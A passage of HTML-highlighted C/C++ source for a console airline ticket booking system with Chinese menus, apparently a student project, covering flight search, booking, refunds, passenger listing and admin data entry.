class="comment">//写入文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>((fp=fopen(<span class="string">"./user.txt"</span>,<span class="string">"w"</span>))==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;use; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main_menu</span><span class="params">()</span>   <span class="comment">//开始界面 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    account=<span class="number">0</span>;<span class="comment">//无需输入管理员密码 </span></span><br><span class="line">    <span class="keyword">int</span> choic_number; <span class="comment">//命令选择</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   ◤＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝◥\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖      欢迎使用飞机订票系统         ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                          by Damya ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖===================================‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    1.浏览航班信息                 ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    2.查找航班信息                 ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    3.订票                         ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    4.退票                         ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    5.浏览乘客信息                 ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    6.退出                         ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ‖    0.管理                         ‖\n"</span></span><br><span class="line">               <span class="string">"\t\t\t\t   ‖                                   ‖\n"</span> </span><br><span class="line">               <span class="string">"\t\t\t\t   ◣＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝◢\n\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   请在0-6中选择并回车键执行:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choic_number);</span><br><span class="line">    <span class="keyword">switch</span>(choic_number)<span class="comment">//输入对应编号跳转到对应子函数 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            Login(); <span class="keyword">break</span>;<span class="comment">//管理</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            List(); <span class="keyword">break</span>;<span class="comment">//浏览 </span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Search();<span class="keyword">break</span>;<span class="comment">//查询</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            Book();<span class="keyword">break</span>;<span class="comment">//订票</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Back();<span class="keyword">break</span>;<span class="comment">//退票</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            bill();<span class="keyword">break</span>;<span class="comment">//订单</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            drop();<span class="keyword">break</span>;<span class="comment">//退出 </span></span><br><span class="line">        <span class="keyword">default</span>:<span class="comment">//输入非编号内容,跳转到开始界面 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   输入错误，请重新输入!\n\n"</span>);</span><br><span class="line">            main_menu();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    deal();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="keyword">int</span> air_id,i=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在查找航班   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   ************************************************************\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   *        1、按航班号查询        2、按抵达地点查询     *\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   ************************************************************\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入查询方式:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;select);<span class="comment">// 通过输入的编号运行相应的子函数 </span></span><br><span class="line">            <span class="keyword">if</span>(select==<span class="number">1</span>)&#123;</span><br><span class="line">                Search_id();<span class="comment">//按航班号查询 </span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(select==<span class="number">2</span>)&#123;</span><br><span class="line">                Search_end();<span class="comment">//按抵达地点查询 </span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"cls"</span>);<span class="comment">// 输错清屏重输</span></span><br><span class="line">                Search();</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_research</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> element)</span><span class="comment">//这里定义了二分查找,通过左半边、右半边、中间值三个值进行比较,对数据进行排序 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;<span class="comment">//定义中间值 </span></span><br><span class="line">        <span class="keyword">if</span>(data[mid].ID&gt;element)</span><br><span class="line">        &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(data[mid].ID&lt;element)</span><br><span class="line">        &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_id</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a_id,c=count;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">-1</span>, w = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请您输入要查询的飞机航班号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a_id);</span><br><span class="line">    i=binary_research(<span class="number">0</span>,c,a_id);</span><br><span class="line">    <span class="keyword">if</span>(i!=<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n\n\n"</span>,data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,data[i].P_num,data[i].price);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span> (i== <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有您想查询的航班!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_end</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a_end[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> i, w = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请您输入要前往的目的地："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, a_end);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(a_end,data[i].<span class="built_in">end</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        w=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n"</span>,data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,data[i].P_num,data[i].price);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (w==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有您想查询的航班!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);  <span class="comment">//返回请继续输入信息 </span></span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Book</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a_end[<span class="number">20</span>];<span class="comment">//定义一个新的机终点变量 </span></span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i, w = <span class="number">0</span>,p,num,s;<span class="comment">//用w进行判断 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在进行订票   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请您输入要前往的目的地："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, a_end);<span class="comment">//输入飞机终点 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;<span class="comment">//按照写入文件中的数据数列出 </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(a_end,data[i].<span class="built_in">end</span>)==<span class="number">0</span>&amp;&amp;data[i].P_num!=<span class="number">0</span>)&#123;<span class="comment">//列出想要查找的还有票的目的地 </span></span><br><span class="line">        w=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n"</span>,data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,data[i].P_num,data[i].price);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请选择您的航班:"</span>);</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;p;<span class="comment">//c语言的标准输入输出流,给p赋值,下方同理 </span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p==data[i].ID)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入你的名字:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;user[use].name;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入你的证件号:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;user[use].card;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入购票数:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   确认购票请支付%d元,请按1确认:"</span>,data[i].price*num);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   购票成功!"</span>);</span><br><span class="line">                    data[i].P_num-=num;<span class="comment">//票数-1 </span></span><br><span class="line">                    writeData();</span><br><span class="line">                        user[use].bill=use+<span class="number">1000</span>;<span class="comment">//订单号比较好看 </span></span><br><span class="line">                        user[use].ticket=num;</span><br><span class="line">                        user[use].airID=data[i].ID;</span><br><span class="line">                        use++;</span><br><span class="line">                        userWrite();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (w==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有您想查询的航班!\n"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Back</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> b,y;</span><br><span class="line">    <span class="keyword">int</span> i,w=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在进行退票   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的姓名:"</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;lname;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的证件号:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,lcard);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(lname,user[i].name)==<span class="number">0</span>&amp;&amp;user[i].ticket!=<span class="number">0</span>&amp;&amp;<span class="built_in">strcmp</span>(lcard,user[i].card)==<span class="number">0</span>)&#123;<span class="comment">//输出和乘客信息符合的已订票信息</span></span><br><span class="line">            <span class="keyword">if</span>(w==<span class="number">0</span>)&#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            w++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,不存在该乘客!\n"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入订单:"</span>);</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">            <span class="keyword">int</span> j,t;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)</span><br><span class="line">                <span class="keyword">if</span>(b==user[i].bill)</span><br><span class="line">                &#123;</span><br><span class="line">                    t=i;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   确认退票1:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;y;</span><br><span class="line">                    <span class="keyword">if</span>(y==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;count;j++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(data[j].ID==b)</span><br><span class="line">                        &#123;</span><br><span class="line">                            data[j].P_num+=user[i].ticket;</span><br><span class="line">                            writeData();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                user[t].ticket=<span class="number">0</span>;</span><br><span class="line">                user[t].airID=<span class="number">0</span>;</span><br><span class="line">                userWrite();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   退票成功!\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i,w=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在浏览订单   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的姓名:"</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;lname;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的证件号:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,lcard);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(lname,user[i].name)==<span class="number">0</span>&amp;&amp;user[i].ticket!=<span class="number">0</span>&amp;&amp;<span class="built_in">strcmp</span>(lcard,user[i].card)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(w==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">            w=<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,不存在该乘客!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">        getch();</span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   |+---------------------------+|\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |        感谢您的使用     |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |+---------------------------+|\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">admire</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choic_number; <span class="comment">//命令选择</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   +------欢迎使用订票管理系统--------+\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    1.航班信息录入                |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    2.航班信息修改                  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    3.航班乘客信息                  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    4.航班列表                    |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    5.整理航班信息                  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    6.返回大厅                    |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |    0.退出                        |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   +----------------------------------+\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入操作指令:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choic_number);</span><br><span class="line">    <span class="keyword">switch</span>(choic_number)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            input(); <span class="keyword">break</span>;<span class="comment">//录入 </span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            fix(); <span class="keyword">break</span>; <span class="comment">//修改 </span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            passager();<span class="keyword">break</span>; <span class="comment">//乘客信息</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            List();<span class="keyword">break</span>;<span class="comment">//航班列表</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            order();<span class="keyword">break</span>; <span class="comment">//整理航班信息</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            main_menu();<span class="keyword">break</span>;<span class="comment">//返回大厅</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            drop();<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   输入错误，请重新输入!"</span>);</span><br><span class="line">            admire();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next;<span class="comment">//继续操作 </span></span><br><span class="line">    inf++;<span class="comment">//计数 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在录入航班信息   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入航班号:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].ID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起降时间:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入日期:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起点:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入终点:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].<span class="built_in">end</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入余票:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].P_num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入票价:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].price);</span><br><span class="line">        count++;</span><br><span class="line">        writeData();<span class="comment">//写入数据 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   %d个数据录入完毕\n"</span>,inf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   继续录入请按1,结束操作请按任意键返回上一层\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;next);</span><br><span class="line">        <span class="keyword">if</span>(next==<span class="number">1</span>) input();</span><br><span class="line">        <span class="keyword">else</span> system(<span class="string">"cls"</span>); admire();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;<span class="comment">// 定义浏览时的行数 </span></span><br><span class="line">    <span class="built_in">string</span> str;<span class="comment">// 声明一个空字符串,用于储存数据 </span></span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(<span class="string">"plane.txt"</span>, ios::in)</span></span>;  <span class="comment">// 定义一个来自plane.txt的输入流,并用in方式读取,文件不存在不会创建新文件 </span></span><br><span class="line">    <span class="keyword">if</span>(!fin)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   文件不存在!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在浏览航班   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="keyword">while</span>(getline(fin, str))<span class="comment">// 读取一行字符直到换行符,是c++的函数 </span></span><br><span class="line">    &#123;</span><br><span class="line">        cnt++;<span class="comment">// 依次向下读取数据 </span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; str &lt;&lt;<span class="built_in">endl</span>;<span class="comment">// 将字符串输出到屏幕并换行 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">    getch();</span><br><span class="line">    main_menu();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    plane t,temp;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;right) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    temp=data[left]; <span class="comment">//temp中存的就是基准数</span></span><br><span 